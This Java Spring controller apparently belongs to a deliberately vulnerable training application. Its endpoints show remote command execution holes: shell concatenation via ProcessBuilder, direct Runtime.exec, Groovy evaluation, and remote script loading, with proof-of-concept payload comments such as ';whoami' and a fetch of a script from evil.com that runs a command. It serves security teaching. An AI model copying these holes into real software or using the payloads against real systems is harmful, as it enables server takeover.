package com.best.hello.controller;

import com.best.hello.util.Security;
import groovy.lang.GroovyShell;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.script.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

/**
 * RCE需要关注的函数
 * 1. ProcessBuilder类: new ProcessBuilder(cmdArray).start()
 * 2. Runtime类：Runtime.getRuntime().exec()
 * 3. groovy类
 *
 * @author nul1
 * @date 2021/06/29
 *
 */

@RestController
@RequestMapping("/RCE")
public class RCE {

    /**
     * @vul 调用ProcessBuilder执行ls命令，接收参数filepath，拼接命令语句
     * @poc http://127.0.0.1:8888/RCE/ProcessBuilder?filepath=/tmp;whoami
     */
    @RequestMapping("/ProcessBuilder")
    public static String cmd(String filepath) {
        // 提供一个命令字典
        String[] cmdList = {"sh", "-c", "ls -l " + filepath};
        StringBuilder sb = new StringBuilder();
        String line;

        // 利用指定的操作系统程序和参数构造一个进程生成器
        ProcessBuilder pb = new ProcessBuilder(cmdList);
        pb.redirectErrorStream(true);

        // 使用此进程生成器的属性启动一个新进程
        Process process = null;
        try {
            System.out.println("[Vul] 执行ProcessBuilder：" + filepath);
            process = pb.start();
            // 取得命令结果的输出流
            InputStream fis = process.getInputStream();
            // 用一个读输出流类去读
            InputStreamReader isr = new InputStreamReader(fis);
            // 用缓存器读行
            BufferedReader br = new BufferedReader(isr);
            //直到读完为止
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return sb.toString();
    }

    /**
     * @vul 使用Runtime.getRuntime().exec()执行命令
     * @poc http://127.0.0.1:8888/RCE/runtime?cmd=id
     */
    @RequestMapping("/runtime")
    public static String cmd2(String cmd) {
        StringBuilder sb = new StringBuilder();
        String line;

        try {
            // 执行命令
            Process proc = Runtime.getRuntime().exec(cmd);
            System.out.println("[Vul] 执行runtime：" + cmd);

            InputStream fis = proc.getInputStream();
            InputStreamReader isr = new InputStreamReader(fis);
            BufferedReader br = new BufferedReader(isr);
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
        return sb.toString();
    }


    /**
    * @safe 这种方式不存在命令执行
    */
    @RequestMapping("/runtime2")
    public static void cmd3(String cmd) {
        String test = ";echo 1 > 1.txt";
        String Command = "ping 127.0.0.1" + test;

        try {
            Runtime.getRuntime().exec(Command);
        } catch (IOException e) {
            e.printStackTrace();
        }
        //Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", Command});
    }

    /**
     * @vul groovy执行命令
     * @poc http://127.0.0.1:8888/RCE/groovy?cmd="open -a Calculator".execute()
     */
    @GetMapping("/groovy")
    public void groovy(String cmd) {
        GroovyShell shell = new GroovyShell();
        shell.evaluate(cmd);
    }


    /**
     * @vul 调用远程js脚本程序进行封装
     * @poc http://127.0.0.1:8888/RCE/js?url=http://evil.com/java/1.js
     * js代码：var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     */
    @GetMapping("/js")
    public String jsEngine(String url) {
        try {
            // 通过脚本名称获取
            // ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");
            // 通过文件扩展名获取
            ScriptEngine engine = new ScriptEngineManager().getEngineByExtension("js");

            // Bindings：用来存放数据的容器
            Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
            String payload = String.format("load('%s')", url);
            System.out.println("[Vul] " + payload);
            engine.eval(payload, bindings);
            return "漏洞执行成功";
        } catch (Exception e) {
            return "加载远程脚本: " + url;
        }
    }

    /*
     * JShell
     */

    @RequestMapping("/ProcessBuilder/safe")
    public static String processbuilderSafe(String filepath) {

        if (! Security.checkOs(filepath)) {

            String[] cmdList = {"sh", "-c", "ls -l " + filepath};
            StringBuilder sb = new StringBuilder();
            String line;

            ProcessBuilder pb = new ProcessBuilder(cmdList);
            pb.redirectErrorStream(true);

            Process process = null;
            try {
                process = pb.start();
                InputStream fis = process.getInputStream();
                InputStreamReader isr = new InputStreamReader(fis);
                BufferedReader br = new BufferedReader(isr);

                while ((line = br.readLine()) != null) {
                    System.out.println(line);
                    sb.append(line);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
            return sb.toString();
        } else {
            return "检测到非法命令注入";
        }
    }


}
